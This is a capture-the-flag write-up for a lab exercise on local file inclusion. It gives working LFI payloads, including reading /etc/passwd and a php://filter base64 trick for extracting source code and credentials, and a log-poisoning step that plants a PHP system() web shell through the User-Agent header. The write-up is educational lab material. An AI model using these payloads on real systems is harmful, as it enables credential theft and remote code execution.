## TASK-1 Use the entry point to perform LFI to read the /etc/flag file. What is the flag?

Visit the web server. You can see a error message on the screen. Notice ```/?err=error.txt``` in the url. It indicates that ```/?err``` parameter is used to fetch
the content of the error.txt file which is then shown in the page.<br>

Try removing ```error.txt``` and adding ```/etc/passwd```, which is successfull which shows that the parameter is vulnerable to <strong>LFI</strong>.

## TASK-2 Use the entry point to perform LFI to read the /etc/flag file. What is the flag?

Using the same above method try to fetch ```/etc/flag```. You should get a flag ```THM{REDACTED}```

## TASK-3 Use the PHP filter technique to read the source code of the index.php. What is the $flag variable's value?

If you try to fetch the ```index.php``` from err parameter. We get errors because the web server tries to execute the PHP code So, we need to use <b>PHP filtering</b>
```/?err=php://filter/convert.base64-encode/resource=index.php```. This will encode the ```index.php``` in base64 and return it to the page. <br>

Decode the base64 encoded value using [Base64decoder](https://www.base64decode.org). And you will get something like this.<br>
```php
<?php session_start();
$flag = "THM{REDACTED}";
include("./includes/creds.php");
if($_SESSION['username'] === $USER){                        
	header( 'Location: manage.php' );
	die();
} else {
	$labNum = "";
  require "./includes/header.php";
?>
...SNIP...
```
There comes the flag!

## TASK-3 Now that you read the index.php, there is a login credential PHP file's path. Use the PHP filter technique to read its content.

In the above decoded PHP script, in the 3rd line it i trying to include a file called ```creds.php``` from includes directory.<br>
Try to access the file same like we did in Task-2and again decode the base64 value, the decoded code looks something like this.
```php
<?php 
$USER = "REDACTED";
$PASS = "REDACTED";
?>
```
## TASK-4 Use the credentials to login into the web application. What is the password of the flag.thm.aoc server?

Use the credentials from TASK-3 and login to the site. Under <strong>Password Recovery</strong>. There you will find the flag in plain text.

## TASK-5 Use the LFI to gain RCE via the log file page. What is the hostname of the webserver?

Since, this web server logs all the traffic coming to the server in the log file, with <strong>User-Agent</strong>. We can use <b>Log Poisoning</b> to get <b>RCE</b>
by tampering the User-Agent in the request.<br>

```curl -A "<?php echo 'Test';system(\$_GET['cmd']);?>" http://url/index.php```

Send this request from your commandline. Now try to access ``` http://url/index.php&cmd=hostname``` and visit ```http://url/index.php/?err=../../../var/www/html/includes/logs/app_access.log```<br>
and you should see the output of the command in the log file.

Detailed Video Explaination can be found in : [here](https://youtu.be/pGPE5uCI5h8)

<h3><b>That's it for Day-6. Happy Hacking! </b></h3>








